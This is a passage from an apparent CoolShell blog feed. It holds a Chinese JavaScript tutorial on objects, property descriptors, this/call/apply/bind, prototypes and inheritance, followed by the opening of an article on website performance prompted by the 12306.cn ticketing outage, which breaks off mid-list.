<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%9F%A5%E7%9C%8B%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE" title="查看对象属性配置">查看对象属性配置</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#call%EF%BC%8Capply%EF%BC%8C_bind_%E5%92%8C_this" title="call，apply， bind 和 this">call，apply， bind 和 this</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%BB%A7%E6%89%BF_%E5%92%8C_%E9%87%8D%E8%BD%BD" title="继承 和 重载">继承 和 重载</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%BB%84%E5%90%88" title="组合">组合</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Prototype_%E5%92%8C_%E7%BB%A7%E6%89%BF" title="Prototype 和 继承">Prototype 和 继承</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-9" href="#%E5%85%BC%E5%AE%B9%E6%80%A7" title="兼容性">兼容性</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#Objectcreate%E5%87%BD%E6%95%B0" title="Object.create()函数">Object.create()函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#defineProperty%E5%87%BD%E6%95%B0" title="defineProperty()函数">defineProperty()函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#keys%E5%87%BD%E6%95%B0" title="keys()函数">keys()函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#ObjectgetPrototypeOf_%E5%87%BD%E6%95%B0" title="Object.getPrototypeOf() 函数">Object.getPrototypeOf() 函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#bind_%E5%87%BD%E6%95%B0" title="bind 函数">bind 函数</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%88%9D%E6%8E%A2"></span>初探<span class="ez-toc-section-end"></span>
</h4>
<p>我们知道Javascript中的变量定义基本如下：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var name = 'Chen Hao';;
var email = 'haoel(@)hotmail.com';
var website = 'https://coolshell.cn';</pre>
<p>如果要用对象来写的话，就是下面这个样子：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var chenhao = {
    name :'Chen Hao',
    email : 'haoel(@)hotmail.com',
    website : 'https://coolshell.cn'
};</pre>
<p>于是，我就可以这样访问：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//以成员的方式
chenhao.name;
chenhao.email;
chenhao.website;

//以hash map的方式
chenhao["name"];
chenhao["email"];
chenhao["website"];
</pre>
<p>关于函数，我们知道Javascript的函数是这样的：</p>
<p><span id="more-6441"></span></p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var doSomething = function(){
   alert('Hello World.');
};</pre>
<p>于是，我们可以这么干：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var sayHello = function(){
   var hello = "Hello, I'm "+ this.name
                + ", my email is: " + this.email
                + ", my website is: " + this.website;
   alert(hello);
};

//直接赋值，这里很像C/C++的函数指针
chenhao.Hello = sayHello;

chenhao.Hello();
</pre>
<p>相信这些东西都比较简单，大家都明白了。 可以看到javascript对象函数是直接声明，直接赋值，直接就用了。runtime的动态语言。</p>
<p>还有一种比较规范的写法是：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//我们可以看到， 其用function来做class。
var Person = function(name, email, website){
    this.name = name;
    this.email = email;
    this.website = website;

    this.sayHello = function(){
        var hello = "Hello, I'm "+ this.name  + ", \n" +
                    "my email is: " + this.email + ", \n" +
                    "my website is: " + this.website;
        alert(hello);
    };
};

var chenhao = new Person("Chen Hao", "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8c0c9c7cdc4e8c0c7dcc5c9c1c486cbc7c5">[email protected]</a>",
                                     "https://coolshell.cn");
chenhao.sayHello(); </pre>
<p>顺便说一下，要删除对象的属性，很简单：</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">delete chenhao['email']</code></p>
<p>上面的这些例子，我们可以看到这样几点：</p>
<ol>
<li>Javascript的数据和成员封装很简单。没有类完全是对象操作。纯动态！</li>
<li>Javascript function中的this指针很关键，如果没有的话，那就是局部变量或局部函数。</li>
<li>Javascript对象成员函数可以在使用时临时声明，并把一个全局函数直接赋过去就好了。</li>
<li>Javascript的成员函数可以在实例上进行修改，也就是说不同实例相同函数名的行为不一定一样。</li>
</ol>
<h4>
<span class="ez-toc-section" id="%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE_-_ObjectdefineProperty"></span>属性配置 – Object.defineProperty<span class="ez-toc-section-end"></span>
</h4>
<p>先看下面的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//创建对象
var chenhao = Object.create(null);

//设置一个属性
 Object.defineProperty( chenhao,
                'name', { value:  'Chen Hao',
                          writable:     true,
                          configurable: true,
                          enumerable:   true });

//设置多个属性
Object.defineProperties( chenhao,
    {
        'email'  : { value:  '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="167e7779737a567e79627b777f7a3875797b">[email protected]</a>',
                     writable:     true,
                     configurable: true,
                     enumerable:   true },
        'website': { value: 'https://coolshell.cn',
                     writable:     true,
                     configurable: true,
                     enumerable:   true }
    }
);
</pre>
<p>下面就说说这些属性配置是什么意思。</p>
<ul>
<li>writable：这个属性的值是否可以改。</li>
<li>configurable：这个属性的配置是否可以改。</li>
<li>enumerable：这个属性是否能在for…in循环中遍历出来或在Object.keys中列举出来。</li>
<li>value：属性值。</li>
<li>get()/set(_value)：get和set访问器。</li>
</ul>
<h4>
<span class="ez-toc-section" id="GetSet_%E8%AE%BF%E9%97%AE%E5%99%A8"></span>Get/Set 访问器<span class="ez-toc-section-end"></span>
</h4>
<p>关于get/set访问器，它的意思就是用get/set来取代value（其不能和value一起使用），示例如下：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var  age = 0;
Object.defineProperty( chenhao,
            'age', {
                      get: function() {return age+1;},
                      set: function(value) {age = value;}
                      enumerable : true,
                      configurable : true
                    }
);
chenhao.age = 100; //调用set
alert(chenhao.age); //调用get 输出101（get中+1了）;
</pre>
<p>我们再看一个更为实用的例子——利用已有的属性(age)通过get和set构造新的属性(birth_year)：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">Object.defineProperty( chenhao,
            'birth_year',
            {
                get: function() {
                    var d = new Date();
                    var y = d.getFullYear();
                    return ( y - this.age );
                },
                set: function(year) {
                    var d = new Date();
                    var y = d.getFullYear();
                    this.age = y - year;
                }
            }
);

alert(chenhao.birth_year);
chenhao.birth_year = 2000;
alert(chenhao.age);
</pre>
<p>这样做好像有点麻烦，你说，我为什么不写成下面这个样子：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var chenhao = {
    name: "Chen Hao",
    email: "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2149404e444d61494e554c40484d0f424e4c">[email protected]</a>",
    website: "https://coolshell.cn",
    age: 100,
    get birth_year() {
        var d = new Date();
        var y = d.getFullYear();
        return ( y - this.age );
    },
    set birth_year(year) {
        var d = new Date();
        var y = d.getFullYear();
        this.age = y - year;
    }

};
alert(chenhao.birth_year);
chenhao.birth_year = 2000;
alert(chenhao.age);
</pre>
<p>是的，你的确可以这样的，不过通过defineProperty()你可以干这些事：<br>
1）设置如 writable，configurable，enumerable 等这类的属性配置。<br>
2）动态地为一个对象加属性。比如：一些HTML的DOM对像。</p>
<h4>
<span class="ez-toc-section" id="%E6%9F%A5%E7%9C%8B%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE"></span>查看对象属性配置<span class="ez-toc-section-end"></span>
</h4>
<p>如果查看并管理对象的这些配置，下面有个程序可以输出对象的属性和配置等东西：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//列出对象的属性.
function listProperties(obj)
{
    var newLine = "&lt;br /&gt;";
    var names = Object.getOwnPropertyNames(obj);
    for (var i = 0; i &lt; names.length; i++) {
        var prop = names[i];
        document.write(prop + newLine);

        // 列出对象的属性配置（descriptor）动用getOwnPropertyDescriptor函数。
        var descriptor = Object.getOwnPropertyDescriptor(obj, prop);
        for (var attr in descriptor) {
            document.write("..." + attr + ': ' + descriptor[attr]);
            document.write(newLine);
        }
        document.write(newLine);
    }
}

listProperties(chenhao);</pre>
<h4>
<span class="ez-toc-section" id="call%EF%BC%8Capply%EF%BC%8C_bind_%E5%92%8C_this"></span>call，apply， bind 和 this<span class="ez-toc-section-end"></span>
</h4>
<p>关于Javascript的this指针，和C++/Java很类似。 我们来看个示例：（这个示例很简单了，我就不多说了）</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function print(text){
    document.write(this.value + ' - ' + text+ '&lt;br&gt;');
}

var a = {value: 10, print : print};
var b = {value: 20, print : print};

print('hello');// this =&gt; global, output "undefined - hello"

a.print('a');// this =&gt; a, output "10 - a"
b.print('b'); // this =&gt; b, output "20 - b"

a['print']('a'); // this =&gt; a, output "10 - a"
</pre>
<p>我们再来看看call 和 apply，这两个函数的差别就是参数的样子不一样，另一个就是性能不一样，apply的性能要差很多。（关于性能，可到 <a href="https://jsperf.com/" target="_blank">JSPerf</a> 上去跑跑看看）</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">print.call(a, 'a'); // this =&gt; a, output "10 - a"
print.call(b, 'b'); // this =&gt; b, output "20 - b"

print.apply(a, ['a']); // this =&gt; a, output "10 - a"
print.apply(b, ['b']); // this =&gt; b, output "20 - b"</pre>
<p>但是在bind后，this指针，可能会有不一样，但是因为Javascript是动态的。如下面的示例</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var p = print.bind(a);
p('a');             // this =&gt; a, output "10 - a"
p.call(b, 'b');     // this =&gt; a, output "10 - b"
p.apply(b, ['b']);  // this =&gt; a, output "10 - b"</pre>
<h4>
<span class="ez-toc-section" id="%E7%BB%A7%E6%89%BF_%E5%92%8C_%E9%87%8D%E8%BD%BD"></span>继承 和 重载<span class="ez-toc-section-end"></span>
</h4>
<p>通过上面的那些示例，我们可以通过Object.create()来实际继承，请看下面的代码，Student继承于Object。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW" data-enlighter-highlight="20">var Person = Object.create(null);

Object.defineProperties
(
    Person,
    {
        'name'  : {  value: 'Chen Hao'},
        'email'  : { value : '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4129202e242d01292e352c20282d6f222e2c">[email protected]</a>'},
        'website': { value: 'https://coolshell.cn'}
    }
);

Person.sayHello = function () {
    var hello = "&lt;p&gt;Hello, I am "+ this.name  + ", &lt;br&gt;" +
                "my email is: " + this.email + ", &lt;br&gt;" +
                "my website is: " + this.website;
    document.write(hello + "&lt;br&gt;");
}

var Student = Object.create(Person);
Student.no = "1234567"; //学号
Student.dept = "Computer Science"; //系

//使用Person的属性
document.write(Student.name + ' ' + Student.email + ' ' + Student.website +'&lt;br&gt;');

//使用Person的方法
Student.sayHello();

//重载SayHello方法
Student.sayHello = function (person) {
    var hello = "&lt;p&gt;Hello, I am "+ this.name  + ", &lt;br&gt;" +
                "my email is: " + this.email + ", &lt;br&gt;" +
                "my website is: " + this.website + ", &lt;br&gt;" +
                "my student no is: " + this. no + ", &lt;br&gt;" +
                "my departent is: " + this. dept;
    document.write(hello + '&lt;br&gt;');
}
//再次调用
Student.sayHello();

//查看Student的属性（只有 no 、 dept 和 重载了的sayHello）
document.write('&lt;p&gt;' + Object.keys(Student) + '&lt;br&gt;');
</pre>
<p>通用上面这个示例，我们可以看到，Person里的属性并没有被真正复制到了Student中来，但是我们可以去存取。这是因为Javascript用委托实现了这一机制。其实，这就是Prototype，Person是Student的Prototype。</p>
<p>当我们的代码需要一个属性的时候，Javascript的引擎会先看当前的这个对象中是否有这个属性，如果没有的话，就会查找他的Prototype对象是否有这个属性，一直继续下去，直到找到或是直到没有Prototype对象。</p>
<p>为了证明这个事，我们可以使用Object.getPrototypeOf()来检验一下：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">Student.name = 'aaa';

//输出 aaa
document.write('&lt;p&gt;' + Student.name + '&lt;/p&gt;');

//输出 Chen Hao
document.write('&lt;p&gt;' +Object.getPrototypeOf(Student).name + '&lt;/p&gt;');</pre>
<p>于是，你还可以在子对象的函数里调用父对象的函数，就好像C++里的 Base::func() 一样。于是，我们重载hello的方法就可以使用父类的代码了，如下所示：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW" data-enlighter-highlight="3">//新版的重载SayHello方法
Student.sayHello = function (person) {
    Object.getPrototypeOf(this).sayHello.call(this);
    var hello = "my student no is: " + this. no + ", &lt;br&gt;" +
                "my departent is: " + this. dept;
    document.write(hello + '&lt;br&gt;');
}</pre>
<p>这个很强大吧。</p>
<h4>
<span class="ez-toc-section" id="%E7%BB%84%E5%90%88"></span>组合<span class="ez-toc-section-end"></span>
</h4>
<p>上面的那个东西还不能满足我们的要求，我们可能希望这些对象能真正的组合起来。为什么要组合？因为我们都知道是这是OO设计的最重要的东西。不过，这对于Javascript来并没有支持得特别好，不好我们依然可以搞定个事。</p>
<p>首先，我们需要定义一个Composition的函数：（target是作用于是对象，source是源对象），下面这个代码还是很简单的，就是把source里的属性一个一个拿出来然后定义到target中。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function Composition(target, source)
{
    var desc  = Object.getOwnPropertyDescriptor;
    var prop  = Object.getOwnPropertyNames;
    var def_prop = Object.defineProperty;

    prop(source).forEach(
        function(key) {
            def_prop(target, key, desc(source, key))
        }
    )
    return target;
}
</pre>
<p>有了这个函数以后，我们就可以这来玩了：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW" data-enlighter-highlight="19,23">//艺术家
var Artist = Object.create(null);
Artist.sing = function() {
    return this.name + ' starts singing...';
}
Artist.paint = function() {
    return this.name + ' starts painting...';
}

//运动员
var Sporter = Object.create(null);
Sporter.run = function() {
    return this.name + ' starts running...';
}
Sporter.swim = function() {
    return this.name + ' starts swimming...';
}

Composition(Person, Artist);
document.write(Person.sing() + '&lt;br&gt;');
document.write(Person.paint() + '&lt;br&gt;');

Composition(Person, Sporter);
document.write(Person.run() + '&lt;br&gt;');
document.write(Person.swim() + '&lt;br&gt;');

//看看 Person中有什么？（输出：sayHello,sing,paint,swim,run）
document.write('&lt;p&gt;' + Object.keys(Person) + '&lt;br&gt;');
</pre>
<h4>
<span class="ez-toc-section" id="Prototype_%E5%92%8C_%E7%BB%A7%E6%89%BF"></span>Prototype 和 继承<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来说说Prototype。我们先看下面的例程，这个例程不需要解释吧，很像C语言里的函数指针，在C语言里这样的东西见得多了。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var plus = function(x,y){
    document.write( x + ' + ' + y + ' = ' + (x+y) + '&lt;br&gt;');
    return x + y;
};

var minus = function(x,y){
    document.write(x + ' - ' + y + ' = ' + (x-y) + '&lt;br&gt;');
    return x - y;
};

var operations = {
    '+': plus,
    '-': minus
};

var calculate = function(x, y, operation){
    return operations[operation](x, y);
};

calculate(12, 4, '+');
calculate(24, 3, '-');
</pre>
<p>那么，我们能不能把这些东西封装起来呢，我们需要使用prototype。看下面的示例：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW" data-enlighter-highlight="6,11">var Cal = function(x, y){
    this.x = x;
    this.y = y;
}

Cal.prototype.operations = {
    '+': function(x, y) { return x+y;},
    '-': function(x, y) { return x-y;}
};

Cal.prototype.calculate = function(operation){
    return this.operations[operation](this.x, this.y);
};

var c = new Cal(4, 5);

c.calculate('+');
c.calculate('-');</pre>
<p>这就是prototype的用法，prototype 是javascript这个语言中最重要的内容。网上有太多的文章介始这个东西了。说白了，prototype就是对一对象进行扩展，其特点在于通过“复制”一个已经存在的实例来返回新的实例,而不是新建实例。被复制的实例就是我们所称的“原型”，这个原型是可定制的（当然，这里没有真正的复制，实际只是委托）。上面的这个例子中，我们扩展了实例Cal，让其有了一个operations的属性和一个calculate的方法。</p>
<p>这样，我们可以通过这一特性来实现继承。还记得我们最最前面的那个Person吧， 下面的示例是创建一个Student来继承Person。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function Person(name, email, website){
    this.name = name;
    this.email = email;
    this.website = website;
};

Person.prototype.sayHello = function(){
    var hello = "Hello, I am "+ this.name  + ", &lt;br&gt;" +
                "my email is: " + this.email + ", &lt;br&gt;" +
                "my website is: " + this.website;
    return hello;
};

function Student(name, email, website, no, dept){
    var proto = Object.getPrototypeOf;
    proto(Student.prototype).constructor.call(this, name, email, website);
    this.no = no;
    this.dept = dept;
}

// 继承prototype
Student.prototype = Object.create(Person.prototype);

//重置构造函数
Student.prototype.constructor = Student;

//重载sayHello()
Student.prototype.sayHello = function(){
    var proto = Object.getPrototypeOf;
    var hello = proto(Student.prototype).sayHello.call(this) + '&lt;br&gt;';
    hello += "my student no is: " + this. no + ", &lt;br&gt;" +
             "my departent is: " + this. dept;
    return hello;
};

var me = new Student(
    "Chen Hao",
    "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0f676e606a634f67607b626e6663216c6062">[email protected]</a>",
    "https://coolshell.cn",
    "12345678",
    "Computer Science"
);
document.write(me.sayHello());</pre>
<h4>
<span class="ez-toc-section" id="%E5%85%BC%E5%AE%B9%E6%80%A7"></span>兼容性<span class="ez-toc-section-end"></span>
</h4>
<p>上面的这些代码并不一定能在所有的浏览器下都能运行，因为上面这些代码遵循 ECMAScript 5 的规范，关于ECMAScript 5 的浏览器兼容列表，你可以看这里“<a href="https://kangax.github.com/es5-compat-table/" target="_blank">ES5浏览器兼容表</a>”。</p>
<p>本文中的所有代码都在Chrome最新版中测试过了。</p>
<p>下面是一些函数，可以用在不兼容ES5的浏览器中：</p>
<h5>
<span class="ez-toc-section" id="Objectcreate%E5%87%BD%E6%95%B0"></span>Object.create()函数<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function clone(proto) {
    function Dummy() { }

    Dummy.prototype             = proto;
    Dummy.prototype.constructor = Dummy;

    return new Dummy(); //等价于Object.create(Person);
}

var me = clone(Person);
</pre>
<h5>
<span class="ez-toc-section" id="defineProperty%E5%87%BD%E6%95%B0"></span>defineProperty()函数<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function defineProperty(target, key, descriptor) {
    if (descriptor.value){
        target[key] = descriptor.value;
    }else {
        descriptor.get &amp;&amp; target.__defineGetter__(key, descriptor.get);
        descriptor.set &amp;&amp; target.__defineSetter__(key, descriptor.set);
    }

    return target
}</pre>
<h5>
<span class="ez-toc-section" id="keys%E5%87%BD%E6%95%B0"></span>keys()函数<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function keys(object) { var result, key
    result = [];
    for (key in object){
        if (object.hasOwnProperty(key))  result.push(key)
    }

    return result;
}</pre>
<h5>
<span class="ez-toc-section" id="ObjectgetPrototypeOf_%E5%87%BD%E6%95%B0"></span>Object.getPrototypeOf() 函数<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function proto(object) {
    return !object?                null
         : '__proto__' in object?  object.__proto__
         : /* not exposed? */      object.constructor.prototype
}</pre>
<h5>
<span class="ez-toc-section" id="bind_%E5%87%BD%E6%95%B0"></span>bind 函数<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var slice = [].slice

function bind(fn, bound_this) { var bound_args
    bound_args = slice.call(arguments, 2)
    return function() { var args
        args = bound_args.concat(slice.call(arguments))
        return fn.apply(bound_this, args) }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>W3CSchool</li>
<li>MDN (Mozilla Developer Network)</li>
<li>MSDN (Microsoft Software Development Network)</li>
<li>
<a href="https://killdream.github.com/blog/2011/10/understanding-javascript-oop/" target="_blank">Understanding Javascript OOP</a>.</li>
</ul>
<p><span style="color: #cc0000;"><strong>（转载时请注明作者和出处，请勿用于任何商业用途）</strong></span></p>
 ]]></content>
<pubDate>2012-01-09T08:16:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/6441.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 由12306.cn谈谈网站性能技术 ]]></title>
<link>https://coolshell.cn/articles/6470.html</link>
<content><![CDATA[ 
<p>12306.cn网站挂了，被全国人民骂了。我这两天也在思考这个事，我想以这个事来粗略地和大家讨论一下网站性能的问题。因为仓促，而且完全基于本人有限的经验和了解，所以，如果有什么问题还请大家一起讨论和指正。（这又是一篇长文，只讨论性能问题，不讨论那些UI，用户体验，或是是否把支付和购票下单环节分开的功能性的东西）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%9A%E5%8A%A1" title="业务">业务</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%8A%80%E6%9C%AF" title="前端性能优化技术">前端性能优化技术</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%80%E3%80%81%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1" title="一、前端负载均衡">一、前端负载均衡</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BA%8C%E3%80%81%E5%87%8F%E5%B0%91%E5%89%8D%E7%AB%AF%E9%93%BE%E6%8E%A5%E6%95%B0" title="二、减少前端链接数">二、减少前端链接数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%B8%89%E3%80%81%E5%87%8F%E5%B0%91%E7%BD%91%E9%A1%B5%E5%A4%A7%E5%B0%8F%E5%A2%9E%E5%8A%A0%E5%B8%A6%E5%AE%BD" title="三、减少网页大小增加带宽">三、减少网页大小增加带宽</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%9B%9B%E3%80%81%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E9%9D%99%E6%80%81%E5%8C%96" title="四、前端页面静态化">四、前端页面静态化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%BA%94%E3%80%81%E4%BC%98%E5%8C%96%E6%9F%A5%E8%AF%A2" title="五、优化查询">五、优化查询</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%AD%E3%80%81%E7%BC%93%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98" title="六、缓存的问题">六、缓存的问题</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-9" href="#%E5%90%8E%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%8A%80%E6%9C%AF" title="后端性能优化技术">后端性能优化技术</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E5%86%97%E4%BD%99" title="一、数据冗余">一、数据冗余</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E4%BA%8C%E3%80%81%E6%95%B0%E6%8D%AE%E9%95%9C%E5%83%8F" title="二、数据镜像">二、数据镜像</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E4%B8%89%E3%80%81%E6%95%B0%E6%8D%AE%E5%88%86%E5%8C%BA" title="三、数据分区">三、数据分区</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%9B%9B%E3%80%81%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1" title="四、后端系统负载均衡">四、后端系统负载均衡</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#%E4%BA%94%E3%80%81%E5%BC%82%E6%AD%A5%E3%80%81_throttle_%E5%92%8C_%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86" title="五、异步、 throttle 和 批量处理">五、异步、 throttle 和 批量处理</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E5%B0%8F%E7%BB%93" title="小结">小结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%9A%E5%8A%A1"></span>业务<span class="ez-toc-section-end"></span>
</h4>
<p>任何技术都离不开业务需求，所以，要说明性能问题，首先还是想先说说业务问题。</p>
<ul>
<li>
<strong>其一</strong>，<strong>有人可能把这个东西和QQ或是网游相比</strong>。但我觉得这两者是不一样的，网游和QQ在线或是登录时访问的更多的是用户自己的数据，而订票系统访问的是中心的票量数据，这是不一样的。不要觉得网游或是QQ能行你就以为这是一样的。网游和QQ 的后端负载相对于电子商务的系统还是简单。</li>
</ul>
<ul>
<li>
<strong>其二</strong>，<strong>有人说春节期间订火车的这个事好像网站的秒杀活动</strong>。的确很相似，但是如果你的思考不在表面的话，你会发现这也有些不一样。火车票这个事，一方面会伴随着大量的查询操作，更BT的是下单的时候需要对数据库很多的一致性的操作，一方面是从起点到终点各个分段票的一致性，另一方面，买的人路线、车次、时间选择有很多，会不停地改变下单方式。而秒杀，直接杀就好了，没有那么多查询和一致性的问题。另外，关于秒杀，完全可以做成只接受前N个用户的请求（完全不操作后端的任何数据， 仅仅只是对用户的下单操作log），这种业务，只需要在内存cache中放好可秒杀的数量，还可以把数据分布开来放，100商品，10台服务器一台放10个，无需在当时操作任何数据库。可以订单数够后，停止秒杀，然后批量写数据库。而且秒杀的商品不多。火车票这个不是像秒杀那么简单的，春运时间，几乎所有的票都是热门票，而且几乎是全国人民都来了，而且还有转车业务，多条线的库存都要做事务操作，你想想吧，这有多难。（淘宝的双十一也就3百万用户，而火车票瞬时有千万级别甚至是亿级别的）（<strong>更新：2014年1月11日</strong>：来了淘宝后，对淘宝的系统有了解，淘宝的秒杀活动，本质上是用输验证码并在CDN上把用户直接过滤掉了，比如：1千万个用户过滤了只剩2万个用户，这样数据库就顶得住了）</li>
</ul>
<ul>
<li>
<strong>其三</strong>，<strong>有人拿这个系统和奥运会的票务系统比较</strong>。我觉得还是不一样。虽然奥运会的票务系统当年也一上线就废了。但是奥运会用的是抽奖的方式，也就是说不存在先来先得的抢的方式，而且，是事后抽奖，事前只需要收信息，事前不需要保证数据一致性，没有锁，很容易水平扩展。</li>
</ul>
<ul>
<li>
<strong>其四</strong>，<strong>订票系统应该和电子商务的订单系统很相似</strong>，都是需要对库存进行：1）占住库存，2）支付（可选），3）扣除库存的操作。这个是需要有一致性的检查的，也就是在并发时需要对数据加锁的。B2C的电商基本上都会把这个事干成异步的，也就是说，你下的订单并不是马上处理的，而是延时处理的，只有成功处理了，系统才会给你一封确认邮件说是订单成功。我相信有很多朋友都收到认单不成功的邮件。<strong>这就是说，数据一致性在并发下是一个瓶颈</strong>。</li>
</ul>
<p><span id="more-6470"></span></p>
<ul>
<li>
<strong>其五</strong>，<strong>铁路的票务业务很变态</strong>，其采用的是突然放票，而有的票又远远不够大家分，所以，大家才会有抢票这种有中国特色的业务的做法。于是当票放出来的时候，就会有几百万人甚至上千万人杀上去，查询，下单。几十分钟内，一个网站能接受几千万的访问量，这个是很恐怖的事情。<a href="http://www.linuxso.com/architecture/17006.html" target="_blank">据说12306的高峰访问是10亿PV</a>，集中在早8点到10点，每秒PV在高峰时上千万。</li>
</ul>
<p>多说几句：</p>
<ul>
<li>
